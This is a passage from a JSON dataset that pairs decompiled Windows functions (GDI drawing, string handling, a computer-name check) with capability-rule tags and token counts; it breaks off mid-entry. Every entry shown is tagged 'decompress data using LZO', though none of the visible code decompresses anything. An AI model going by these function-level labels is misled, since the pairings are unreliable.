        "decompiled_code": "\nvoid __fastcall fcn.0040e820(uint param_1)\n\n{\n    char cVar1;\n    \n    fcn.00405584(param_1);\n    cVar1 = fcn.0040e7d8();\n    if (cVar1 == '\\0') {\n        fcn.00405818();\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "0040e86c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e86c(uint param_1)\n\n{\n    char cVar1;\n    \n    fcn.00405584(param_1);\n    cVar1 = fcn.0040e7d8();\n    if (cVar1 != '\\0') {\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "0040e8f4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040e8f4(uint param_1, int32_t *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    if (*0x4958d4 == '\\0') {\n        uVar4 = fcn.00409ad0();\n    }\n    else {\n        iVar3 = in_EAX;\n        if (in_EAX != 0) {\n            iVar3 = *(in_EAX + -4);\n        }\n        uVar4 = fcn.00405c6c();\n        iVar6 = 1;\n        if (0 < iVar3) {\n            do {\n                iVar5 = fcn.00405a3c();\n                *(iVar5 + -1 + iVar6) = *(in_EAX + -1 + iVar6);\n                uVar4 = *(in_EAX + -1 + iVar6);\n                if ((*((uVar4 >> 3) + 0x48f828) >> (uVar4 & 7) & 1) == 0) {\n                    cVar2 = *(*param_2 + -1 + iVar6);\n                    uVar4 = cVar2 + 0xa5;\n                    if (cVar2 + 0xbfU < 0x1a) {\n                        uVar4 = fcn.00405a3c();\n                        pcVar1 = (uVar4 - 1) + iVar6;\n                        *pcVar1 = *pcVar1 + ' ';\n                    }\n                }\n                else {\n                    iVar6 = iVar6 + 1;\n                    uVar4 = fcn.00405a3c();\n                    *((uVar4 - 1) + iVar6) = *(in_EAX + -1 + iVar6);\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 <= iVar3);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 449
    },
    "00411648": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411648(int32_t arg_8h, uint16_t *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint pvarg;\n    uint *var_8h;\n    int32_t *var_4h;\n    \n    if (*arg_ch == 0x400c) {\n        fcn.00411648(arg_8h, *(arg_ch + 4), arg_10h, arg_14h);\n        return;\n    }\n    if (arg_8h == 0) {\n        var_8h = NULL;\n    }\n    else {\n        sub.oleaut32.dll_VariantInit();\n        var_8h = &pvarg;\n    }\n    uVar3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uVar1 = *arg_ch;\n    if (uVar1 < 0x102) {\n        if ((uVar1 == 0x101) || ((uVar1 == 9 || (uVar1 == 0xd)))) {\ncode_r0x004116c8:\n            if (*0x49797c != NULL) {\n                (**0x49797c)(var_8h, arg_ch, arg_10h, &arg_14h);\n            }\n            goto code_r0x00411713;\n        }\n    }\n    else if ((uVar1 == 0x4009) || (uVar1 == 0x400d)) goto code_r0x004116c8;\n    cVar2 = fcn.00416168();\n    if (cVar2 == '\\0') {\n        fcn.00410ee4();\n    }\n    else {\n        (**(*var_4h + 0x10))(&arg_14h, arg_10h);\n    }\ncode_r0x00411713:\n    *in_FS_OFFSET = uVar3;\n    if (var_8h != NULL) {\n        fcn.00411a58();\n        fcn.0041162c();\n    }\n    return;\n}\n",
        "token_count": 475
    },
    "00415720": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415720(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    \n    uVar1 = *param_2;\n    if (uVar1 < 0xe) {\n        if (uVar1 != 0xd) {\n            if (uVar1 == 0) {\n                fcn.0040700c();\n                return;\n            }\n            if (uVar1 == 1) {\n                if (*0x48fa5c != '\\0') {\n                    fcn.00410e48();\n                }\n                fcn.0040700c();\n                return;\n            }\n            if (uVar1 != 9) goto code_r0x004157a1;\n        }\n        fcn.00407024();\n    }\n    else {\n        if (uVar1 == 0x101) {\n            fcn.004156a8(param_1);\n            return;\n        }\n        if ((uVar1 == 0x4009) || (uVar1 == 0x400d)) {\n            fcn.00407024();\n            return;\n        }\ncode_r0x004157a1:\n        cVar2 = fcn.00416168();\n        if (cVar2 != '\\0') {\n            fcn.0040700c();\n            cVar2 = fcn.00404704();\n            if (cVar2 != '\\0') {\n                return;\n            }\n        }\n        fcn.00410e48();\n    }\n    return;\n}\n",
        "token_count": 338
    },
    "004166d4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004166d4(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *puStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack28 = 0x416763;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.004164d8();\n    cVar1 = *in_EAX;\n    if (cVar1 == '\\x01') {\n        puStack36 = 0x416710;\n        fcn.00409ecc();\n    }\n    else if ((cVar1 == '\\x02') || (cVar1 == '\\t')) {\n        puStack36 = &fcn.004166d4::var_4h;\n        fcn.00405a44();\n        fcn.00409ecc();\n    }\n    else {\n        puStack36 = 0x41674b;\n        fcn.00416530();\n    }\n    *in_FS_OFFSET = puStack36;\n    uStack28 = 0x41676a;\n    iStack32 = 0x416762;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 305
    },
    "0041a654": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041a717)\n// WARNING: Removing unreachable block (ram,0x0041a6c1)\n// WARNING: Removing unreachable block (ram,0x0041a6cd)\n// WARNING: Removing unreachable block (ram,0x0041a739)\n// WARNING: Removing unreachable block (ram,0x0041a722)\n// WARNING: Removing unreachable block (ram,0x0041a744)\n\nvoid fcn.0041a654(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x41a77d;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    iVar1 = (**(*in_EAX + 0x14))();\n    fcn.0041af50();\n    iVar2 = iVar1;\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00405620();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x41a784;\n    uStack60 = 0x41a76f;\n    fcn.00405530();\n    uStack60 = 0x41a77c;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 482
    },
    "0041ac3c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041ac66)\n\nvoid fcn.0041ac3c(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41ac8d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    (**(*in_EAX + 0x1c))();\n    fcn.0041b968();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41ac94;\n    uStack24 = 0x41ac8c;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 189
    },
    "0041ad24": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041ae0a)\n\nvoid __fastcall fcn.0041ad24(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char *pcVar3;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    code *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x41aead;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack64 = 0x41ad56;\n    fcn.0041a2fc();\n    uStack68 = 0x41ae7b;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    (**(*in_EAX + 0x44))();\n    if (param_2 != NULL) {\n        fcn.0041af50();\n        iVar2 = fcn.004098dc();\n        if (iVar2 == 0) {\n            while (*param_2 != '\\0') {\n                for (; ((cVar1 = *param_2,  cVar1 != '\\0' && (cVar1 != '\\n')) && (cVar1 != '\\r')); param_2 = param_2 + 1\n                    ) {\n                }\n                fcn.00405620();\n                (**(*in_EAX + 0x38))();\n                if (*param_2 == '\\r') {\n                    param_2 = param_2 + 1;\n                }\n                if (*param_2 == '\\n') {\n                    param_2 = param_2 + 1;\n                }\n            }\n        }\n        else {\n            if (*(*0x4927e0 + 0xc) == '\\0') {\n                var_10h = fcn.0040aa44;\n            }\n            else {\n                var_10h = fcn.0040e988;\n            }\n            fcn.0041af50();\n            while (*param_2 != '\\0') {\n                fcn.0041af50();\n                fcn.004059dc();\n                pcVar3 = (*var_10h)();\n                for (; (*param_2 != '\\0' && (pcVar3 != param_2)); param_2 = param_2 + 1) {\n                }\n                fcn.00405620();\n                (**(*in_EAX + 0x38))();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x41ae82;\n    uStack68 = 0x41ae7a;\n    fcn.0041a3b8();\n    return;\n}\n",
        "token_count": 697
    },
    "0041c118": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0041c118(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.004059dc();\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 47
    },
    "0041d074": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041d09b)\n// WARNING: Removing unreachable block (ram,0x0041d0a3)\n\nvoid fcn.0041d074(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x41d0c4;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    fcn.0041e9a0();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41d0cb;\n    uStack20 = 0x41d0c3;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 189
    },
    "0041dddc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041de31)\n\nvoid __fastcall fcn.0041dddc(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack76;\n    uint uStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack56 = &stack0xfffffffc;\n    uStack48 = 0x41e024;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x41dfd6;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack68 = 0x41de17;\n    fcn.0041e964();\n    uStack72 = 0x41dfaf;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iVar3 = 1;\n    *(in_EAX + 0x88) = 1;\n    var_14h = param_2;\n    puStack68 = &stack0xfffffffc;\n    while( true ) {\n        for (; (iVar3 < 1 && (*(iVar3 + -1) != '.')); iVar3 = iVar3 + 1) {\n        }\n        iStack76 = in_EAX + 0x80;\n        fcn.00405a44();\n        if (0 < iVar3) break;\n        fcn.00404890();\n        puVar2 = fcn.00416594();\n        if (puVar2 == NULL) {\n            fcn.00405584();\n            *(in_EAX + 0x88) = 0;\n            (**(*var_14h + 4))();\n            *(in_EAX + 0x88) = 1;\n            if (*(in_EAX + 0x80) != 0) {\n                fcn.0041cfc4();\n            }\n            *in_FS_OFFSET = iStack76;\n            *in_FS_OFFSET = iStack64;\ncode_r0x0041e00e:\n            *in_FS_OFFSET = iStack52;\n            puStack44 = 0x41e02b;\n            uStack48 = 0x41e023;\n            fcn.00405530();\n            return;\n        }\n        var_18h = NULL;\n        if (***puVar2 == '\\a') {\n            var_18h = fcn.00416604();\n        }\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            fcn.0041ddc0(&stack0xfffffffc);\n        }\n        var_14h = var_18h;\n        iVar3 = iVar3 + 1;\n    }\n    fcn.00404890();\n    iVar3 = fcn.00416594();\n    if (iVar3 == 0) {\n        *(in_EAX + 0x88) = 0;\n        (**(*var_14h + 4))();\n        *(in_EAX + 0x88) = 1;\n        if (*(in_EAX + 0x80) != 0) {\n            fcn.0041cfc4();\n        }\n    }\n    else {\n        fcn.0041e1d8();\n    }\n    *in_FS_OFFSET = iStack76;\n    *in_FS_OFFSET = iStack64;\n    goto code_r0x0041e00e;\n}\n",
        "token_count": 875
    },
    "0041f588": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f588(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    \n    bVar1 = *0x10 == 0x14;\n    fcn.00405974();\n    if (bVar1) {\n        if (param_2 != 0) {\n            param_2 = *(param_2 + -4);\n        }\n        if (param_2 < 0x100) {\n            fcn.0041f688();\n            fcn.0041f48c();\n        }\n        else {\n            fcn.0041f688();\n            fcn.0041f48c();\n        }\n        fcn.0041f48c();\n    }\n    else {\n        fcn.0041f688();\n        fcn.0041f48c();\n        fcn.0041f48c();\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00421f88": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421f88(int32_t param_1)\n\n{\n    uint arg_8h;\n    \n    if (param_1 != 0) {\n        param_1 = *(param_1 + -4);\n    }\n    param_1 = param_1 + 1;\n    arg_8h = 1;\n    fcn.004059dc();\n    fcn.00422108(arg_8h, param_1);\n    return;\n}\n",
        "token_count": 102
    },
    "00421fb8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421fb8(int32_t param_1)\n\n{\n    uint arg_8h;\n    \n    if (param_1 != 0) {\n        param_1 = *(param_1 + -4);\n    }\n    param_1 = param_1 + 1;\n    arg_8h = 2;\n    fcn.004059dc();\n    fcn.00422108(arg_8h, param_1);\n    return;\n}\n",
        "token_count": 102
    },
    "0042540c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042540c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint in_ECX;\n    int32_t in_EDX;\n    uint Y;\n    int32_t X;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.00425770();\n    cVar1 = fcn.004253e0();\n    X = in_EDX;\n    if (cVar1 == '\\x01') {\n        iVar2 = fcn.004254f0();\n        X = in_EDX + iVar2 + 1;\n    }\n    if (arg_8h != 0) {\n        arg_8h = *(arg_8h + -4);\n    }\n    uVar3 = fcn.004059dc(arg_8h, 0);\n    sub.gdi32.dll_ExtTextOutA(in_EAX[1], X, in_ECX, in_EAX[0x15], 0, uVar3);\n    fcn.004254f0();\n    fcn.00425378();\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 272
    },
    "004254a8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004254a8(uint *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    fcn.00425770();\n    *param_1 = 0;\n    param_1[1] = 0;\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    uVar1 = fcn.004059dc(param_2, param_1);\n    sub.gdi32.dll_GetTextExtentPoint32A(*(in_EAX + 4), uVar1);\n    return;\n}\n",
        "token_count": 141
    },
    "00425c08": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.00425c08(void)\n\n{\n    int16_t in_AX;\n    \n    if (((in_AX != 1) && (in_AX != 4)) && (in_AX != 8)) {\n        return 0;\n    }\n    return 1 << (in_AX & 0x1f);\n}\n",
        "token_count": 71
    },
    "00429a1c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00429a1c(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    \n    uVar4 = 8;\n    cVar3 = fcn.0042999c();\n    if (cVar3 == '\\x01') {\n        uVar4 = 0;\n    }\n    else {\n        iVar2 = *(in_EAX + 0x28);\n        uVar1 = *(iVar2 + 0x3e);\n        if (uVar1 < 0x11) {\n            if (uVar1 == 0x10) {\n                if (*(iVar2 + 0x40) == 0) {\n                    uVar4 = 4;\n                }\n                else if ((*(iVar2 + 0x40) == 3) && (*(iVar2 + 0x5c) == 0x7e0)) {\n                    uVar4 = 5;\n                }\n            }\n            else if (uVar1 == 1) {\n                uVar4 = 1;\n            }\n            else if (uVar1 == 4) {\n                uVar4 = 2;\n            }\n            else if (uVar1 == 8) {\n                uVar4 = 3;\n            }\n        }\n        else if (uVar1 == 0x18) {\n            uVar4 = 6;\n        }\n        else if ((uVar1 == 0x20) && (*(iVar2 + 0x40) == 0)) {\n            uVar4 = 7;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 364
    },
    "00429f64": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00429f64(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    bool bVar5;\n    uint uVar6;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uchar *puStack256;\n    uint uStack252;\n    int32_t *piStack248;\n    uint uStack244;\n    uint *puStack240;\n    uint uStack236;\n    uchar *puStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack212;\n    uint uStack208;\n    uchar *puStack204;\n    uint uStack200;\n    uint uStack196;\n    uchar *puStack192;\n    uint var_aah;\n    uint var_48h;\n    uint var_44h;\n    ushort var_40h;\n    ushort var_3eh;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint hpal;\n    uint hgdiobj;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint lpbmih;\n    int32_t lpbInit;\n    uint var_10h;\n    uint hdc;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack204 = &stack0xfffffffc;\n    puStack192 = 0x429f97;\n    var_8h = in_EDX;\n    (**(*in_EDX + 0xc))();\n    bVar5 = var_20h == 0xc;\n    if (bVar5) {\n        var_20h = 0x28;\n    }\n    puStack192 = 0x429fbc;\n    piVar1 = fcn.00402f00();\n    uStack196 = 0x42a485;\n    uStack200 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff38;\n    uStack208 = 0x42a458;\n    uStack212 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff2c;\n    if (bVar5) {\n        puStack204 = &stack0xfffffffc;\n        puStack192 = &stack0xfffffffc;\n        (**(*var_8h + 0xc))();\n        fcn.00403af4();\n        piVar1[1] = var_44h;\n        piVar1[2] = var_44h._2_2_;\n        *(piVar1 + 3) = var_40h;\n        *(piVar1 + 0xe) = var_3eh;\n    }\n    else {\n        puStack192 = &stack0xfffffffc;\n        (**(*var_8h + 0xc))();\n        if ((piVar1[4] != 3) && (piVar1[4] != 0)) {\n            var_8h = fcn.00404620();\n            if (arg_8h == 0) {\n                fcn.00403af4();\n            }\n            (**(*var_8h + 0x10))();\n            (**(*var_8h + 0x10))();\n            (**(*var_8h + 0x10))();\n            uStack224 = 0x42a0ea;\n            fcn.0041b9a0(in_ECX - var_20h, 0);\n            uStack224 = 0x42a0fa;\n            (**(*var_8h + 0x14))();\n        }\n    }\n    *piVar1 = var_20h;\n    if (*(piVar1 + 3) != 1) {\n        fcn.00425978();\n    }\n    if ((var_20h == 0x28) && (((*(piVar1 + 0xe) == 0x10 || (*(piVar1 + 0xe) == 0x20)) && (piVar1[4] == 3)))) {\n        fcn.0041b930();\n    }\n    if (piVar1[8] == 0) {\n        iVar2 = fcn.00425c08();\n        piVar1[8] = iVar2;\n    }\n    fcn.0041b930();\n    if ((piVar1[5] == 0) || (piVar1[4] == 0)) {\n        iVar2 = fcn.00425c28();\n        uVar4 = piVar1[2] >> 0x1f;\n        piVar1[5] = iVar2 * ((piVar1[2] ^ uVar4) - uVar4);\n    }\n    if (bVar5) {\n        fcn.00425ed4();\n    }\n    sub.user32.dll_GetDC();\n    uStack252 = fcn.00425a98();\n    uStack224 = 0x42a3d3;\n    uStack228 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff1c;\n    hdc = uStack252;\n    if (((piVar1[4] == 0) || (piVar1[4] == 3)) && (*0x48fbb8 == '\\0')) {\n        puStack232 = NULL;\n        uStack236 = 0;\n        puStack240 = &fcn.00429f64::lpbInit;\n        uStack244 = 0;\n        puStack256 = 0x42a359;\n        piStack248 = piVar1;\n        iVar2 = sub.gdi32.dll_CreateDIBSection();\n        if ((iVar2 == 0) || (lpbInit == 0)) {\n            puStack256 = 0x42a36d;\n            iVar2 = sub.kernel32.dll_GetLastError_1();\n            if (iVar2 == 0) {\n                puStack256 = 0x42a376;\n                fcn.00425978();\n            }\n            else {\n                puStack256 = 0x42a37d;\n                fcn.0040f25c();\n            }\n        }\n        uStack260 = 0x42a3a2;\n        uStack264 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffef8;\n        uStack268 = 0x42a398;\n        puStack256 = &stack0xfffffffc;\n        fcn.0041b930();\n        *in_FS_OFFSET = uStack264;\n        *in_FS_OFFSET = uStack252;\n        uStack244 = 0x42a3da;\n        piStack248 = hdc;\n        uStack252 = 0;\n        puStack256 = 0x42a3d2;\n        sub.user32.dll_ReleaseDC();\n        return;\n    }\n    var_10h = 0;\n    puStack232 = 0x42a215;\n    lpbInit = fcn.00402f00();\n    uStack236 = 0x42a33b;\n    puStack240 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff10;\n    uStack244 = 0x42a233;\n    puStack232 = &stack0xfffffffc;\n    fcn.0041b930();\n    uStack244 = hdc;\n    piStack248 = 0x42a23c;\n    sub.gdi32.dll_CreateCompatibleDC();\n    piStack248 = 0x42a241;\n    var_10h = fcn.00425a98();\n    piStack248 = 0x1;\n    uStack252 = 1;\n    puStack256 = hdc;\n    uStack260 = 0x42a251;\n    uStack260 = sub.gdi32.dll_CreateCompatibleBitmap();\n    uStack264 = var_10h;\n    uStack268 = 0x42a25b;\n    uVar3 = sub.gdi32.dll_SelectObject();\n    var_34h = 0;\n    if (piVar1[8] != 0) {\n        uStack268 = 0x42a279;\n        uStack272 = fcn.00426190();\n        uStack268 = 0;\n        uStack276 = var_10h;\n        uStack280 = 0x42a28b;\n        var_34h = sub.gdi32.dll_SelectPalette();\n        uStack280 = var_10h;\n        puStack284 = 0x42a297;\n        sub.gdi32.dll_RealizePalette();\n    }\n    uStack288 = 0x42a30f;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffedc;\n    uVar6 = var_10h;\n    puStack284 = &stack0xfffffffc;\n    iVar2 = sub.gdi32.dll_CreateDIBitmap(var_10h, piVar1, 4, lpbInit, piVar1, 0);\n    if (iVar2 == 0) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n        if (iVar2 == 0) {\n            fcn.00425978();\n        }\n        else {\n            fcn.0040f25c();\n        }\n    }\n    *in_FS_OFFSET = uVar6;\n    if (var_34h != 0) {\n        sub.gdi32.dll_SelectPalette(var_10h, var_34h, 0xffffffff, 0x42a316);\n    }\n    uVar3 = sub.gdi32.dll_SelectObject(var_10h, uVar3);\n    sub.gdi32.dll_DeleteObject(uVar3);\n    return;\n}\n",
        "token_count": 2170
    },
    "0042bedc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042bfad)\n// WARNING: Removing unreachable block (ram,0x0042bfc3)\n\nvoid __fastcall fcn.0042bedc(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uVar4;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint lpBuffer;\n    uint var_38h;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint var_28h;\n    uint var_24h;\n    uint nSize;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack108 = 0x42bf09;\n    var_10h = param_2;\n    fcn.00405fe8();\n    uStack112 = 0x42c07d;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    puStack108 = &stack0xfffffffc;\n    if (*0x48fe9c == NULL) {\n        puStack108 = &stack0xfffffffc;\n        fcn.0040dba8();\n        fcn.00404ec4();\n    }\n    fcn.00403af4();\n    var_24h = fcn.00405eb8();\n    var_38h = *0x42c08c;\n    uStack56 = *0x42c090;\n    uStack52 = *0x42c094;\n    uStack48 = *0x42c098;\n    var_ch = &fcn.0042bedc::var_38h;\n    fcn.0040700c();\n    var_4h = 0;\n    iVar1 = fcn.00405ec8();\n    if (iVar1 < 1) {\n        uVar2 = 0x15;\n    }\n    else {\n        nSize = 0x10;\n        iVar1 = sub.kernel32.dll_GetComputerNameA(&fcn.0042bedc::lpBuffer, &fcn.0042bedc::nSize);\n        if (iVar1 == 0) {\n            bVar3 = false;\n        }\n        else {\n            fcn.004057a0();\n            fcn.004057d4();\n            fcn.004057d4(0);\n            uVar2 = fcn.004059dc();\n            fcn.004057a0(0, uVar2);\n            uVar2 = fcn.004059dc();\n            iVar1 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n            bVar3 = iVar1 == 2;\n        }\n        if (bVar3) {\n            uVar2 = 0x15;\n        }\n        else {\n            uVar2 = 0x10;\n        }\n    }\n    uVar4 = var_10h;\n    (**0x48fe9c)(var_10h, 0, uVar2, &fcn.0042bedc::var_28h, 1, &fcn.0042bedc::var_ch);\n    fcn.0042bd00();\n    fcn.0042bd00();\n    fcn.00407024();\n    *in_FS_OFFSET = uVar4;\n    fcn.00405554(0x42c084);\n    fcn.004060ac();\n    return;\n}\n",
        "token_count": 814
    },
    "0042c3b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
